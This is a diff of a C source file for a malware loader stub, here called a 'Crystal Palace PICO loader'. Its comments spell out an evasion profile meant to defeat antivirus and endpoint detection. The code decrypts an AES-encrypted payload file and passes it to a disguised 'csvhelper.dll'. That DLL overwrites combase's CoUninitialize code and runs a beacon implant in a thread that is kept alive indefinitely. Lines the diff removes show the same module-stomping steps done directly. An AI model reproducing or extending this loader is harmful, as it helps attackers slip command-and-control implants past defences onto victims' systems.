@@ -1,29 +1,42 @@
 /*
- * stager.c — two-file Crystal Palace PICO loader
+ * launcher.c — three-file Crystal Palace PICO loader (launcher stub)
  *
- * Delivery: stager.exe  +  payload.dat  (AES-256-CBC encrypted PICO)
+ * Delivery: launcher.exe + csvhelper.dll + payload.dat
+ *   launcher.exe   this stub — decrypts payload.dat, hands plaintext to
+ *                  csvhelper.dll's PluginRun export
+ *   csvhelper.dll  combase!CoUninitialize slot loader (see plugin.c)
+ *   payload.dat    AES-256-CBC encrypted PICO
  *
  * Evasion profile:
- *  - No embedded payload: stager.exe is ~60 KB with normal entropy
+ *  - No embedded payload: launcher.exe is ~60 KB with normal entropy
  *  - AES-256-CBC via BCrypt (BCRYPT_AES_ALGORITHM) — legitimate crypto,
  *    not a suspicious XOR loop
- *  - VirtualAlloc(RW) + VirtualProtect(RX): no PAGE_EXECUTE_READWRITE ever
- *    held; decryption happens in RW region before RX flip
+ *  - Slot flip (RW→memcpy→RX) is isolated in csvhelper.dll's IAT, not here
  *  - No Nt* strings in .rdata — no GetProcAddress / NtCreateSection pattern
  *  - BCryptGenRandom Poseidon noise + advapi32 import = normal-looking IAT
  *  - GUI subsystem (no console), version info resource (resource.rc)
  *
- * IAT: kernel32, advapi32, bcrypt — VirtualAlloc/VirtualProtect from kernel32.
- * NtCreateSection, NtMapViewOfSection: absent.
+ * IAT: kernel32, advapi32, bcrypt. Slot-flip primitives (VirtualProtect,
+ * CreateThread) live in the plugin, keeping this stub's IAT purely
+ * crypto+filesystem shaped.
+ *
+ * Plugin DLL filename is a compile-time literal fed by the Makefile
+ * (-DPLUGIN_NAME=\"csvhelper.dll\"), loaded from an absolute sibling path to
+ * defeat DLL-search-order hijacks.
  */
 
 #include <windows.h>
 #include <bcrypt.h>
+#include <string.h>
 #include "payload_key.h"  /* payload_key[], payload_key_len,
                               payload_iv[],  payload_iv_len  */
-#include "hellshall.h"
+#include "hellshall.h"    /* unused here — declarations only, no link dep */
 
-typedef void (*pico_fn)(void *);
+#ifndef PLUGIN_NAME
+#  define PLUGIN_NAME "csvhelper.dll"
+#endif
+
+typedef HANDLE (WINAPI *plugin_run_fn)(const void *, SIZE_T);
 
 /* ── Poseidon I/O noise ───────────────────────────────────────────────────── */
 
@@ -113,14 +126,6 @@ cleanup:
     return pt;
 }
 
-/* ── PICO execution thread ───────────────────────────────────────────────── */
-
-static DWORD WINAPI worker(LPVOID param)
-{
-    ((pico_fn)param)(NULL);
-    return 0;
-}
-
 /* ── Entry point ─────────────────────────────────────────────────────────── */
 
 int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
@@ -155,27 +160,38 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     LocalFree(ct);
     if (!pt) return 1;
 
-    HMODULE mod = LoadLibraryA("combase.dll");
-    if (!mod) { LocalFree(pt); return 1; }
-    void *slot = (void *)GetProcAddress(mod, "CoUninitialize");
-    if (!slot) { LocalFree(pt); return 1; }
-
-    DWORD old;
-    if (!VirtualProtect(slot, pt_len, PAGE_READWRITE, &old)) {
-        LocalFree(pt); return 1;
+    /* Resolve absolute sibling path to the plugin DLL — passing a bare
+     * filename to LoadLibrary would honour the DLL search order. */
+    char pluginPath[MAX_PATH];
+    GetModuleFileNameA(NULL, pluginPath, MAX_PATH);
+    char *asep = strrchr(pluginPath, '\\');
+    if (!asep) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
+    asep[1] = '\0';
+    if (strlen(pluginPath) + sizeof(PLUGIN_NAME) > MAX_PATH) {
+        SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1;
     }
-    memcpy(slot, pt, pt_len);
+    strcat(pluginPath, PLUGIN_NAME);
+
+    HMODULE plugin = LoadLibraryA(pluginPath);
+    if (!plugin) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
+
+    plugin_run_fn PluginRun =
+        (plugin_run_fn)GetProcAddress(plugin, "PluginRun");
+    if (!PluginRun) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
+
+    /* PluginRun copies pt → combase slot before returning, so the plaintext
+     * lifetime ends exactly at the call boundary. Zero + free only after. */
+    HANDLE hThread = PluginRun(pt, pt_len);
     SecureZeroMemory(pt, pt_len);
     LocalFree(pt);
 
-    if (!VirtualProtect(slot, pt_len, PAGE_EXECUTE_READ, &old))
-        return 1;
+    if (!hThread) return 1;
 
-    HANDLE h = CreateThread(NULL, 0, worker, slot, 0, NULL);
-    if (!h) return 1;
-
-    WaitForSingleObject(h, INFINITE);
-    CloseHandle(h);
+    /* Do NOT FreeLibrary(plugin): beacon executes in combase's slot and may
+     * call back into combase exports; keep the plugin resident so the
+     * loader's symbol pointers stay valid. */
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
 
     /* Beacon goroutine is alive in this process — keep it running */
     for (;;) SleepEx(30000, TRUE);
